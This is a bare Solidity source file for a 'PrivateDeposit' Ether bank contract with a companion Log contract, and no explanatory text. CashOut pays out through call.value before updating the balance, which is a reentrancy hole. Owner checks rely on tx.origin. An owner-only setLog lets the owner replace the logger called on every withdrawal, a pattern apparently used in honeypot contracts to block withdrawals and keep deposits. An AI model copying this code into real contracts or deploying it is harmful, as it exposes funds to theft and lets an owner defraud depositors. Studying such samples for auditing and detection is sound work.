1 pragma solidity ^0.4.19;
2 
3 contract PrivateDeposit
4 {
5     mapping (address => uint) public balances;
6         
7     uint public MinDeposit = 1 ether;
8     address public owner;
9     
10     Log TransferLog;
11     
12     modifier onlyOwner() {
13         require(tx.origin == owner);
14         _;
15     }    
16     
17     function PrivateDeposit()
18     {
19         owner = msg.sender;
20         TransferLog = new Log();
21     }
22     
23     
24     
25     function setLog(address _lib) onlyOwner
26     {
27         TransferLog = Log(_lib);
28     }    
29     
30     function Deposit()
31     public
32     payable
33     {
34         if(msg.value >= MinDeposit)
35         {
36             balances[msg.sender]+=msg.value;
37             TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
38         }
39     }
40     
41     function CashOut(uint _am)
42     {
43         if(_am<=balances[msg.sender])
44         {            
45             if(msg.sender.call.value(_am)())
46             {
47                 balances[msg.sender]-=_am;
48                 TransferLog.AddMessage(msg.sender,_am,"CashOut");
49             }
50         }
51     }
52     
53     function() public payable{}    
54     
55 }
56 
57 contract Log 
58 {
59    
60     struct Message
61     {
62         address Sender;
63         string  Data;
64         uint Val;
65         uint  Time;
66     }
67     
68     Message[] public History;
69     
70     Message LastMsg;
71     
72     function AddMessage(address _adr,uint _val,string _data)
73     public
74     {
75         LastMsg.Sender = _adr;
76         LastMsg.Time = now;
77         LastMsg.Val = _val;
78         LastMsg.Data = _data;
79         History.push(LastMsg);
80     }
81 }